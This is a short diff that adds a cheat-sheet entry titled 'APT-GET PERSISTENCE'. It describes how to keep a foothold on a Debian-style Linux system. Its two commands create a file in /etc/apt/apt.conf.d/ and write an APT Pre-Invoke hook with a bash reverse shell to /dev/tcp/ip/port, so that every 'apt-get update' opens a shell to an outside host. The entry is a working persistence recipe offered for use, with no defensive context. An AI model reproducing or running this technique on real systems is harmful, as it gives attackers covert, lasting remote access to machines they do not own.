@@ -1,0 +1,13 @@
+##########[APT-GET PERSISTENCE]##########
+
+1 - Create file ex.: "file" on directory "/etc/apt/apt.conf.d/"
+
+user# sudo touch /etc/apt/apt.conf.d/file
+
+2 - Insert payload like a reverse shell into config file using a command
+
+user# sudo echo 'APT::Update::Pre-Invoke {"/bin/bash -i >& /dev/tcp/ip/port 0>&1"};' > /etc/apt/apt.conf.d/file
+
+The next time  "apt-get update" it runs get a reverse shell
+
+##########[END]##########
